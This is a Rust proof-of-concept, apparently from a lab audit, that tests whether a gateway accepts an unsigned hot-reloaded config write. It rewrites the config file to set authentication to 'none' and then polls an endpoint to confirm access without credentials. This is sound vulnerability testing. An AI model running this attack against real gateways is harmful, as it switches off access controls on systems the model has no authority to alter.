// F3 - Hot-reload config evasion.
//
// Hypothesis: the gateway reloads its configuration when the file changes, and
// applies the new rules without validating their origin (no signature, no
// authorisation check), so a process that can write the config file can change
// gateway behaviour - for example turn authentication off.
//
// What this program does to test it:
//   1. reads the gateway's behaviour before any change (baseline)
//   2. writes a new configuration payload to the config file
//   3. waits, without touching the gateway process, and re-reads behaviour
//
// If behaviour changed after step 2, an unsigned config write alone was enough
// to alter the security posture. `--sign` adds a signature field, which a
// validating gateway requires; that path should be rejected.
//
// The earlier version of this file only compared two HTTP statuses and never
// modified anything, so it could not conclude anything.
//
// Build:  rustc F3.rs -o F3
// Run:    ./F3 --config /tmp/lab-gateway.json [--port 18789] [--json] [--sign]

#![allow(dead_code, unused_imports)]

include!("poc_support.rs");

use std::fs;
use std::thread::sleep;

fn write_config(path: &str, auth_mode: &str, sign: bool) -> std::io::Result<()> {
    let mut payload = format!("{{\"auth\":{{\"mode\":\"{auth_mode}\"}}");
    if sign {
        payload.push_str(",\"signature\":\"valid-lab-signature\"");
    } else {
        payload.push_str(",\"signature\":\"\"");
    }
    payload.push('}');
    fs::write(path, payload)
}

fn probe(host: &str, port: u16) -> u16 {
    get(host, port, "/tools/list").map(|r| r.status).unwrap_or(0)
}

fn main() {
    let args = Args::parse();
    let mut report = Report::new("F3", "Hot-reload config evasion");
    if !args.json {
        banner("F3", "Hot-reload config evasion");
        println!("    target: {}", args.addr());
        println!("    config: {}", args.config);
    }

    let before_write = write_config(&args.config, "token", false);
    if before_write.is_err() {
        report.note(format!(
            "cannot write {} - this PoC needs write access to the gateway config file",
            args.config
        ));
        report.finish(args.json, 3);
    }

    // Let the reload watcher observe this first (benign) state. Without this
    // settle time the watcher could see only the attack write and have no
    // baseline to compare against, which would make the test meaningless.
    sleep(std::time::Duration::from_millis(1200));

    let baseline = probe(&args.host, args.port);
    if baseline == 0 {
        report.note(format!("no HTTP response from {}", args.addr()));
        report.finish(args.json, 3);
    }
    report.evidence(format!("baseline /tools/list -> HTTP {baseline}"));

    // Security posture before the change: is auth required at all?
    let auth_required_before = baseline != 200;
    report.evidence(format!(
        "auth required before write: {auth_required_before}"
    ));

    // The attack: rewrite the config to disable auth, no signature.
    let requested = "none";
    if let Err(e) = write_config(&args.config, requested, args.sign) {
        report.note(format!("config write failed: {e}"));
        report.finish(args.json, 3);
    }
    report.evidence(format!(
        "wrote config payload auth.mode={requested} (signed: {})",
        args.sign
    ));

    // Give the watcher time to observe the mtime change and apply it.
    let mut after = baseline;
    for _ in 0..25 {
        sleep(std::time::Duration::from_millis(200));
        after = probe(&args.host, args.port);
        if after != baseline {
            break;
        }
    }
    report.evidence(format!("after write /tools/list -> HTTP {after}"));

    let stats = get(&args.host, args.port, "/stats").map(|r| r.body).unwrap_or_default();
    if let Some(events) = stats.split("\"reload_events\":").nth(1) {
        let events = events.split(']').next().unwrap_or("").trim();
        if !events.is_empty() && events != "[]" {
            report.evidence(format!("gateway reload log: {events}"));
        }
    }

    if after == 200 && auth_required_before {
        report.evidence("authentication was switched off by a config write alone");
        report.note(
            "the reload path accepted an unsigned payload from any writer of the config file",
        );
        report.confirmed = true;
        report.finish(args.json, 0);
    }

    if args.sign {
        report.note(
            "the signed payload was not accepted either; check the config path and watcher",
        );
    } else {
        report.note(format!(
            "behaviour did not change (HTTP {baseline} -> {after}); the reload either did not \
             happen or the new rules were rejected"
        ));
    }
    report.finish(args.json, 1);
}
